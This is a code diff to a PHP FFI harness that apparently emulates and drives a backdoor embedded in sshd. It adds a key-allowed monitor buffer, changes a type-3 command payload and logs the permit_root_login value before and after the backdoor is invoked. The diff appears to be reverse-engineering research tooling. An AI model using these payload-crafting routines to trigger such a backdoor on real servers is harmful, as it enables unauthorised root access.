@@ -67,6 +67,7 @@ class Invoker {
     private CData $nat_sshd_sensitive_data;
     private CData $nat_permit_root_login;
     private CData $nat_monitor_req_authpassword;
+    private CData $nat_monitor_req_keyallowed;
 
     private CData $nat_host_keys;
     private CData $nat_host_pubkeys;
@@ -82,15 +83,22 @@ class Invoker {
         $this->nat_sshd_log_ctx = $ffi->new('sshd_log_ctx_t');
         $this->nat_sshd_sensitive_data = $ffi->new('struct sensitive_data', false);
         $this->nat_permit_root_login = $ffi->new('int');
+        
+        $this->nat_monitor_req_keyallowed = make_array(4+4+8);
         $this->nat_monitor_req_authpassword = make_array(4 + 4 + 8);
+        $data = encode_data(4, 22);
+        FFI::memcpy(FFI::addr($this->nat_monitor_req_keyallowed), $data, strlen($data));
 
         $this->nat_permit_root_login->cdata = 0; // PERMIT_NO
         $this->nat_sshd_ctx->permit_root_login_ptr = FFI::addr($this->nat_permit_root_login);
 
         $monitor_req_authpassword_ptr = FFI::cast('uintptr_t', FFI::addr($this->nat_monitor_req_authpassword));
         $monitor_req_authpassword_ptr->cdata += 4 + 4;
+        $monitor_req_keyallowed_ptr = FFI::cast('uintptr_t', FFI::addr($this->nat_monitor_req_keyallowed));
+        $monitor_req_keyallowed_ptr->cdata += 4 + 4;
 
         $this->nat_sshd_ctx->monitor_req_authpassword = FFI::cast('void *', $monitor_req_authpassword_ptr);
+        $this->nat_sshd_ctx->monitor_req_keyallowed_ptr = FFI::cast('void *', $monitor_req_keyallowed_ptr);
         $this->nat_sshd_ctx->have_mm_answer_keyallowed = 1;
         $this->nat_sshd_ctx->have_mm_answer_authpassword = 1;
         $this->nat_sshd_ctx->have_mm_answer_keyverify = 1;
@@ -282,7 +290,7 @@ class Invoker {
     private function payload_make_type3(){
         $cmd_type = 3;
         $packet = (''
-            . $this->payload_make_args(0, 0xC0, 0, 0)
+            . $this->payload_make_args(0, 0x4, 0, 0)
             . str_repeat("\x00", 0x30)
         );
         return $this->payload_make($cmd_type, $packet);
@@ -349,7 +357,9 @@ class Invoker {
 
     public function cmd_type3(){
         $payload = $this->payload_make_type3();
+        say("permit_root_login: {$this->nat_permit_root_login->cdata}");
         $this->backdoor_invoke($payload);
+        say("permit_root_login: {$this->nat_permit_root_login->cdata}");
     }
 
     public function cmd_patch_sshd(){
@@ -482,9 +492,10 @@ $jmp_exit = [
     $run_backdoor_commands+0xD3E, $run_backdoor_commands+0xD75,
 ];
 $breakpoints = array_unique([...$jmp_bad_data, ...$jmp_disable_backdoor, ...$jmp_exit]);
-$invoker->debug_place_breakpoints(...$breakpoints);
+//$invoker->debug_place_breakpoints(...$breakpoints);
 //$invoker->debug_place_breakpoints();
 //$invoker->debug_place_breakpoints(0x993C);
+//$invoker->debug_place_breakpoints(0xA189);
 
 /*
 print(" ... running system command ...\n");
